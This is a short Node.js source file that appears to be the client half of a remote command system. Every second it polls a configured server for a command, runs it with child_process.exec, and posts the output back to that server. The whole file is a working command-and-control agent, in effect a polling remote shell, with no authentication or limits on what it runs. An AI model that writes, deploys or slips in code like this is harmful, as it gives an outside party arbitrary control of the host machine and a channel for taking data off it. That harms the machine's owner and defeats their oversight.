/**
 * Created by Prakhar on 11/13/2014.
 */

var request = require('request');
var config = require('./config/config');
var exec = require('child_process').exec;

setInterval(function () {
  request({
    uri: 'http://' + config.serverLocation + ':' + config.serverPort + '/getCommand/?id=' + config.clientId,
    method: "GET",
    timeout: 1000,
    followRedirect: true,
    maxRedirects: 3
  }, function (error, response, body) {
    if (!error) {
      if (body != '') {
        console.log('Command:' + body);
        exec(body, function (error, stdout, stderr) {
          if (error) output(stderr);
          else output(stderr + stdout);
        });
      }
    } else {
      console.log(error);
    }
  });
}, 1000);

function output(output) {
  console.log('Output:'+output);
  request.post({ url: 'http://' + config.serverLocation + ':' + config.serverPort + '/postExecute',
        form: { id: config.clientId, output: output}},
      function (error, response, body) {
        if (error || response.statusCode != 200) {
          console.log('Error in sending command output.');
        }
      });
}

